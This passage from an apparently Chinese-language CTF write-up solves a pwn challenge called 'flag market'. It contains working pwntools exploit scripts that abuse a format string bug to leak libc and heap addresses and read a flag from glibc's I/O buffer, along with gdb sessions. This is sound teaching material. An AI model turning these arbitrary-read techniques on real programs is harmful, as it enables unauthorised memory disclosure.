   my_puts(a1m31mError0mSo);</span><br><span class="line">      my_puts(<span class="string">&quot;opened user.log, please report:&quot;</span>);</span><br><span class="line">      my_memset(aEverythingIsOk, <span class="number">0LL</span>, <span class="number">256LL</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, aEverythingIsOk);</span><br><span class="line">      my_getchar(<span class="string">&quot;%s&quot;</span>, aEverythingIsOk);</span><br><span class="line">      v7 = my_open(<span class="string">&quot;user.log&quot;</span>);</span><br><span class="line">      my_write(v7, aEverythingIsOk, <span class="number">256LL</span>);</span><br><span class="line">      my_puts(aOkNowYouCanExi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_printf(aYouAreSoParsim);</span><br><span class="line">      <span class="keyword">if</span> ( dword_40430C )</span><br><span class="line">      &#123;</span><br><span class="line">        my_fclose(v11);</span><br><span class="line">        dword_40430C = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  result = my_exit();</span><br><span class="line">LABEL_16:</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v8 = v16 - v9;</span><br><span class="line">  <span class="keyword">if</span> ( v16 != v9 )</span><br><span class="line">    result = my___stack_chk_fail(v5, v4, v8);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我已经将一些为命令函数进行了重命名操作，这样便于我们的分析。重命名可以依据经验，也可以通过gdb动态调试来确定函数。</p></blockquote><p>程序首先会通过<code>fopen</code>函数打开根目录下的flag文件，接着会出现两个选择即：</p><ul><li>take my money</li><li>exit</li></ul><p>选择二就直接退出了。</p><p>如果我们选择一，那么程序就会通过<code>read</code>函数来获取你的输入，接着判断你输入的值是否是“-1”：</p><ul><li>是：将打开的flag文件中的内容写入到地址&amp;v15处，然后通过for循环逐字节读取flag。但是，遇到“{”之后就会终止读取。接下来，就是一个向上汇报错误的过程。</li><li>不是：打印一段文字，然后关闭（<code>fclose</code>）打开的flag文件。</li></ul><p>很明显，这一部分出现<code>printf</code>函数，而且该函数并没有指定格式化字符，那么会不会存在格式化字符串漏洞？</p><h3 id="2、格式化字符串漏洞"><a href="#2、格式化字符串漏洞" class="headerlink" title="2、格式化字符串漏洞"></a>2、格式化字符串漏洞</h3><p><code>printf</code>的参数来自<code>.data</code>段：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000004041C0 aYouAreSoParsim db &#x27;You are so parsimonious!!!&#x27;,0</span><br></pre></td></tr></table></figure><p>如果我们能控制这一部分的数据，就可以造成格式化字符串漏洞。</p><p>观察后，可以发现我们的<code>scanf</code>函数用的格式化字符是<code>%s</code>即可以无限长地输入（只要不输入空白字符），而且输入的位置刚好也在<code>.data</code>段且位置比“aYouAreSoParsim”低：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00000000004040C0 aEverythingIsOk db &#x27;everything is ok~&#x27;,0</span><br></pre></td></tr></table></figure><p>那么，格式化字符串漏洞的触发就是通过<code>scanf</code>函数的输入来覆盖“aYouAreSoParsim”部分，接着通过<code>printf</code>函数实现漏洞的触发。</p><h3 id="3、思路"><a href="#3、思路" class="headerlink" title="3、思路"></a>3、思路</h3><p>找到了关键漏洞，我们就要理一下思路，即思考我该怎么做才能获得flag？</p><p>首先，我们肯定不能通过任意地址读来去栈上找flag，因为虽然flag被写在了栈上，但是，后续程序利用了<code>my_memset(&amp;v15, 0LL, 64LL);</code>将该位置的信息全都清空了。</p><p>但是，堆上的flag呢？</p><p>可能有人会有疑惑，堆上哪来的flag，整个程序我都没见过堆操作。</p><p>其实是有的。简单来说，I&#x2F;O类型的函数（如<code>fopen</code>，<code>fgets</code>等）为了提到效率，会用到“缓冲”机制，这个缓冲机制就是通过调用<code>malloc</code>来实现的。</p><p>让我们从一个简单的场景开始，逐步深入。</p><p>场景：如果没有缓冲会怎样？</p><p>想象一下，你的程序要从一个文件中读取1MB（大约一百万字节）的数据。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *fp = fopen(<span class="string">&quot;large_file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">    fgetc(fp); <span class="comment">// 一次只读一个字节</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果没有缓冲机制，<code>fgetc</code>的每一次调用都会触发一次系统调用。系统调用是程序从用户态切换到内核态去请求操作系统服务的唯一方式。这个切换过程涉及到上下文保存、权限检查等，开销非常大。</p><p>这意味着，为了读取1MB的数据，你的程序需要进行一百万次的用户态&#x2F;内核态切换。这将会慢得令人无法忍受。</p><p>为了解决这个问题，C标准库（glibc）引入了缓冲机制。</p><p>假设，当你的程序第一次调用<code>fopen</code>打开一个文件时，会发生以下事情：</p><ol><li><strong>创建管理结构</strong>：<code>fopen</code>在内部会调用<code>malloc</code>来开辟一片空间，这片空间中会存放一个叫<code>FILE</code>的结构体（或<code>_IO_FILE_plus</code>），该结构体用来管理：<ul><li>文件的描述符（操作系统给的一个数字）。</li><li>当前读写位置。</li><li>是否发生了错误。</li><li>指向缓冲区的指针。</li></ul></li><li><strong>分配I&#x2F;O缓冲区</strong>：光有管理结构还不够，还需要一个地方来存放从文件里预读出来的数据。这个地方就是I&#x2F;O缓冲区。<ul><li>当你的程序第一次尝试从文件读取数据时（例如，第一次调用<code>fgetc</code>或<code>fgets</code>），<code>_IO_FILE</code>的内部逻辑会检查自己是否有缓冲区。</li><li>如果没有，它就会向内核申请一大块数据，即此时第二次调用了<code>malloc</code>。</li><li>然后，就是读的操作了（它会发出一次系统调用如<code>read</code>），让内核一次性把数据从文件填充到这个新分配的缓冲区里。</li><li>最后，读写函数会从这片缓冲区中操作数据。</li></ul></li></ol><p>在完成了上述初始化之后，后续的I&#x2F;O操作就变得非常高效了：</p><ul><li><code>fgetc</code>的调用，将不再需要任何系统调用。它们只是简单地从那个已经填满数据的堆上缓冲区里，一个接一个地取出字节。这只是纯粹的内存操作，速度极快。</li><li>只有当缓冲区里的数据被全部读完后，下一次读取操作才会再次触发一次系统调用，去请求下一个数据块。</li></ul><p>对于写入操作（如<code>fprintf</code>, <code>fputc</code>），原理也是类似的，这里不再赘述。</p><p>好，了解了这些之后，我们应该知道，堆上为什么也会有flag了吧。</p><p>那么，我们的思路就是，利用格式化字符串漏洞，实现任意地址读取，读到堆上的flag。</p><p>问题又出现了，怎么知道堆的地址呢？</p><p>这又涉及到一个知识点：针对动态链接的程序，在他的libc库中，会存在指向IO缓冲区的指针。</p><blockquote><p>这也很好理解，libc库中有很多的IO函数，那么操作一块堆空间最好的方式就是给我一个指向它的指针。</p></blockquote><p>综上，我们的思路：</p><ol><li>格式化字符串漏洞泄露libc基址。</li><li>通过格式化字符串漏洞泄露堆上的flag。</li></ol><h2 id="四、Poc的构造"><a href="#四、Poc的构造" class="headerlink" title="四、Poc的构造"></a>四、Poc的构造</h2><blockquote><p>根据思路，按部就班地完成Poc的构造。</p></blockquote><h3 id="1、泄露libc基址"><a href="#1、泄露libc基址" class="headerlink" title="1、泄露libc基址"></a>1、泄露libc基址</h3><p>首先分析栈上的构造，程序中的第二个read函数的输入位置为<code>[rbp-60h]</code>。</p><p>flag在栈上的临时位置在<code>[rbp-50h]</code>他们的关系就是：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023213430288-1118781673.png"><img src="/img/flag-market/3622178-20251023213430288-1118781673.png" alt="img"></a></p><p>写一个测试脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    payload += <span class="string">f&#x27;%<span class="subst">&#123;i&#125;</span>$p-&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以看到，运行之后可以看到（关键部分）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x2-(nil)-0x7ffd2c748851-0x1999999999999999-(nil)-0xc000-0x402b00000-0xffffffff00000010-0x27c212a0-0x2f0000000000c000-0x7f0067616c66-0x32-0x404050-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x7ffd2c748990-0x8988df52354d0500-0x7ffd2c748950-0x7e84d7c2a1ca-0x7ffd2c748900-0x7ffd2c7489d8-0x100400040-0x40139b-0x7ffd2c7489d8-0x9a34b258d05c60e2-0x1-(nil)-0x403e18-0x7e84d800c000-0x9a34b258d37c60e2-0x98c7453481fe60e2-0x7ffd00000000-(nil)-(nil)-0x1-0x7ffd2c7489d0-0x8988df52354d0500-0x7ffd2c7489b0-0x7e84d7c2a28b-0x7ffd2c7489e8-0x403e18-0x7ffd2c7489e8-0x40139b-welcome to flag market!</span><br></pre></td></tr></table></figure><p>很明显，这连续的<code>(nil)</code>就是<code>my_memset(&amp;v15, 0LL, 64LL);</code>的杰作。</p><p>因此，我们可以推断，第14个位置就是<code>[rbp-50h]</code></p><p>那么，我们可以通过和<code>read</code>输入的配合，实现：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023214316077-107934784.png"><img src="/img/flag-market/3622178-20251023214316077-107934784.png" alt="img"></a></p><p>本阶段Poc:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding + <span class="string">b&#x27;%13$s#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     payload += f&#x27;%&#123;i&#125;$p-&#x27;.encode()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - <span class="number">0x11ba80</span></span><br></pre></td></tr></table></figure><p>其中，<code>p64(0x404050)</code>是read@got的地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got.plt:0000000000404050 off_404050      dq offset sub_4010A0    ; DATA XREF: my_read+4↑r</span><br></pre></td></tr></table></figure><p><code>0x11ba80</code>，这个偏移量，是<code>read</code>在libc.so.6中的偏移量，为什么选择这个？</p><p>在上述Poc的输出中，会输出泄露的<code>read</code>的真实地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] read_addr:0x78a9a251ba80</span><br></pre></td></tr></table></figure><p>拿这个地址去<a href="https://libc.blukat.me/">网站</a>上搜索一下</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215019295-212912469.png"><img src="/img/flag-market/3622178-20251023215019295-212912469.png" alt="image"></a></p><p>接着问AI：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215116586-1271645686.png"><img src="/img/flag-market/3622178-20251023215116586-1271645686.png" alt="image"></a></p><p>然后在网站上点击该库文件即可看到偏移量：</p><p><a href="https://img2024.cnblogs.com/blog/3622178/202510/3622178-20251023215157409-635275790.png"><img src="/img/flag-market/3622178-20251023215157409-635275790.png" alt="image"></a></p><h3 id="2、找指向缓冲区的指针"><a href="#2、找指向缓冲区的指针" class="headerlink" title="2、找指向缓冲区的指针"></a>2、找指向缓冲区的指针</h3><p>我们通过gdb的find命令，就可以很容易找到在libc中指向缓冲区的指针</p><p>为了程序的顺利执行，我们需要在我们的虚拟器的根目录下创建一个flag文件。原因很简单，我们之前分析过，程序会打开根目录下的flag文件，如果没有找到，就会报错。</p><p>我这已经准备好了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(pwn-env) zyf@zhengyifeng:/mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin$ <span class="built_in">cat</span> /flag</span><br><span class="line">flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;</span><br></pre></td></tr></table></figure><p>gdb打开程序，将断点设置在<code>0x4015B3</code></p><blockquote><p>断点没硬性要求，但是需要在建立缓冲区之后，即<code>fgets</code>之后。</p></blockquote><p>通过<code>got</code>命令找到read的真实地址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line">Filtering out read-only entries (display them with -r or --show-readonly)</span><br><span class="line"></span><br><span class="line">State of the GOT of /mnt/c/Users/14363/Downloads/ctf-downloads/flag-market/bin/chall:</span><br><span class="line">GOT protection: Partial RELRO | Found 17 GOT entries passing the filter</span><br><span class="line">[0x404018] putchar@GLIBC_2.2.5 -&gt; 0x7ffff7c89ce0 (putchar) ◂— endbr64</span><br><span class="line">[0x404020] puts@GLIBC_2.2.5 -&gt; 0x7ffff7c87be0 (puts) ◂— endbr64</span><br><span class="line">[0x404028] write@GLIBC_2.2.5 -&gt; 0x401050 ◂— endbr64</span><br><span class="line">[0x404030] fclose@GLIBC_2.2.5 -&gt; 0x401060 ◂— endbr64</span><br><span class="line">[0x404038] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401070 ◂— endbr64</span><br><span class="line">[0x404040] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x401080 ◂— endbr64</span><br><span class="line">[0x404048] memset@GLIBC_2.2.5 -&gt; 0x7ffff7d89440 (__memset_avx2_unaligned_erms) ◂— endbr64</span><br><span class="line">[0x404050] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7ffff7d1ba80 (<span class="built_in">read</span>) ◂— endbr64</span><br><span class="line">[0x404058] fgets@GLIBC_2.2.5 -&gt; 0x7ffff7c85b30 (fgets) ◂— endbr64</span><br><span class="line">[0x404060] getchar@GLIBC_2.2.5 -&gt; 0x4010c0 ◂— endbr64</span><br><span class="line">[0x404068] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7c88550 (setvbuf) ◂— endbr64</span><br><span class="line">[0x404070] open@GLIBC_2.2.5 -&gt; 0x4010e0 ◂— endbr64</span><br><span class="line">[0x404078] fopen@GLIBC_2.2.5 -&gt; 0x7ffff7c85e60 (fopen64) ◂— endbr64</span><br><span class="line">[0x404080] atoi@GLIBC_2.2.5 -&gt; 0x7ffff7c46660 (atoi) ◂— endbr64</span><br><span class="line">[0x404088] __isoc99_scanf@GLIBC_2.7 -&gt; 0x401110 ◂— endbr64</span><br><span class="line">[0x404090] <span class="built_in">exit</span>@GLIBC_2.2.5 -&gt; 0x401120 ◂— endbr64</span><br><span class="line">[0x404098] <span class="built_in">sleep</span>@GLIBC_2.2.5 -&gt; 0x7ffff7d0ec50 (<span class="built_in">sleep</span>) ◂— endbr64</span><br></pre></td></tr></table></figure><p>算出libc的基址：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="variable">$libc_base</span> =  0x7ffff7d1ba80 - 0x11ba80</span><br><span class="line"><span class="variable">$1</span> = 0x7ffff7c00000</span><br></pre></td></tr></table></figure><p>接下来，我们可以先在堆上找到flag的准确位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405470</span><br><span class="line">Size: 0x1010 (with flag bits: 0x1011)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x406480</span><br><span class="line">Size: 0x1fb80 (with flag bits: 0x1fb81)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x405000 0x500</span><br><span class="line">00:0000│      0x405000 ◂— 0</span><br><span class="line">01:0008│      0x405008 ◂— 0x291</span><br><span class="line">02:0010│      0x405010 ◂— 0</span><br><span class="line">... ↓         80 skipped</span><br><span class="line">53:0298│      0x405298 ◂— 0x1e1</span><br><span class="line">54:02a0│      0x4052a0 ◂— 0xfbad2488</span><br><span class="line">55:02a8│      0x4052a8 —▸ 0x4054ab ◂— 0</span><br><span class="line">56:02b0│      0x4052b0 —▸ 0x4054ab ◂— 0</span><br><span class="line">57:02b8│      0x4052b8 —▸ 0x405480 ◂— <span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">... ↓         4 skipped</span><br><span class="line">5c:02e0│      0x4052e0 —▸ 0x406480 ◂— 0</span><br><span class="line">5d:02e8│      0x4052e8 ◂— 0</span><br><span class="line">... ↓         3 skipped</span><br><span class="line">61:0308│      0x405308 —▸ 0x7ffff7e044e0 (_IO_2_1_stderr_) ◂— 0xfbad2087</span><br><span class="line">62:0310│      0x405310 ◂— 3</span><br><span class="line">63:0318│      0x405318 ◂— 0</span><br><span class="line">64:0320│      0x405320 ◂— 0</span><br><span class="line">65:0328│      0x405328 —▸ 0x405380 ◂— 0</span><br><span class="line">66:0330│      0x405330 ◂— 0xffffffffffffffff</span><br><span class="line">67:0338│      0x405338 ◂— 0</span><br><span class="line">68:0340│      0x405340 —▸ 0x405390 ◂— 0</span><br><span class="line">69:0348│      0x405348 ◂— 0</span><br><span class="line">... ↓         2 skipped</span><br><span class="line">6c:0360│      0x405360 ◂— 0xffffffff</span><br><span class="line">6d:0368│      0x405368 ◂— 0</span><br><span class="line">6e:0370│      0x405370 ◂— 0</span><br><span class="line">6f:0378│      0x405378 —▸ 0x7ffff7e02030 (_IO_file_jumps) ◂— 0</span><br><span class="line">70:0380│      0x405380 ◂— 0</span><br><span class="line">... ↓         29 skipped</span><br><span class="line">8e:0470│      0x405470 —▸ 0x7ffff7e02228 (_IO_wfile_jumps) ◂— 0</span><br><span class="line">8f:0478│      0x405478 ◂— 0x1011</span><br><span class="line">90:0480│      0x405480 ◂— <span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">91:0488│      0x405488 ◂— <span class="string">&#x27;285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">92:0490│      0x405490 ◂— <span class="string">&#x27;b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">93:0498│      0x405498 ◂— <span class="string">&#x27;820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">94:04a0│      0x4054a0 ◂— <span class="string">&#x27;5a639bc1e&#125;\n&#x27;</span></span><br><span class="line">95:04a8│ r8-3 0x4054a8 ◂— 0xa7d65 /* <span class="string">&#x27;e&#125;\n&#x27;</span> */</span><br><span class="line">96:04b0│      0x4054b0 ◂— 0</span><br><span class="line">... ↓         506 skipped</span><br><span class="line">291:1488│      0x406488 ◂— 0x1fb81</span><br><span class="line">292:1490│      0x406490 ◂— 0</span><br><span class="line">... ↓         621 skipped</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>很明显，最低在<code>0x4052b8</code>就出现了。</p><p>现在，我们就可以通过<code>find</code>命令找到那个指针了：</p><blockquote><p>注意，不要直接找flag所在的位置，要找flag所在的那个chunk的位置，因为指针指向的是chunk的位置而不是flag的位置。</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; find /g <span class="variable">$libc_base</span>,<span class="variable">$libc_base</span>+0x400000,0x405000</span><br><span class="line">0x7ffff7e031e0 &lt;mp_+96&gt;</span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0x7ffff7e0ed68, halting search.</span><br><span class="line">1 pattern found.</span><br></pre></td></tr></table></figure><p>找到的<code>0x7ffff7e031e0 &lt;mp_+96&gt;</code>是在libc中的，而且我们已经泄露了libc的地址。那么，我们就可以通过格式化字符串漏洞的任意地址读泄露<code>0x7ffff7e031e0</code>中的内容即堆指针。但是，此时泄露出来的信息是chunk的地址，因此，为了准确定位flag，我们还得知道偏移量即<code>0x480</code></p><h3 id="3、最终Poc"><a href="#3、最终Poc" class="headerlink" title="3、最终Poc"></a>3、最终Poc</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,9999)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*padding + <span class="string">b&#x27;%13$s#&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1,50):</span></span><br><span class="line"><span class="comment">#     payload += f&#x27;%&#123;i&#125;$p-&#x27;.encode()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;opened user.log, please report:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x404050</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;read_addr:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - <span class="number">0x11ba80</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(libc_base+<span class="number">0x2031e0</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">b&#x27;#&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span></span><br><span class="line">success(<span class="string">&quot;heap_addr:&quot;</span> + <span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;2.exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;how much you want to pay?&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(heap_addr+<span class="number">0x480</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，我们在动态调试中找到的那个指针：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x7ffff7e031e0</span><br><span class="line">00:0000│     0x7ffff7e031e0 (mp_+96) —▸ 0x405000 ◂— 0</span><br></pre></td></tr></table></figure><p>在小端序中，其最低地址字节是”\x00”，这就会导致我们构造的格式化字符串”%s”直接戛然而止。</p><p>因此，我们可以通过”地址+1”的手段，来跳过该空字符，然后泄露地址完成之后，通过左移1字节（8位）的操作（对应脚本<code>&lt;&lt; 8</code>），实现最低有效位（<code>\x00</code>）的补回。</p><p>最终Poc的执行效果（关键部分）：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x82 bytes:</span><br><span class="line">    b<span class="string">&#x27;flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;#welcome to flag market!\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;give me money to buy my flag,\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;choice: \n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;1.take my money\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;2.exit\n&#x27;</span></span><br><span class="line">flag&#123;0ec285cb-c1b3-49ff-820b-8075a639bc1e&#125;</span><br><span class="line"><span class="comment">#welcome to flag market!</span></span><br><span class="line">give me money to buy my flag,</span><br><span class="line">choice:</span><br><span class="line">1.take my money</span><br><span class="line">2.<span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>可以看到flag被我们泄露出来了~</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> WP </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fmt格式化字符串漏洞 </tag>
            
            <tag> 任意地址读取 </tag>
            
            <tag> 泄露libc基址 </tag>
            
            <tag> IO_FILE </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
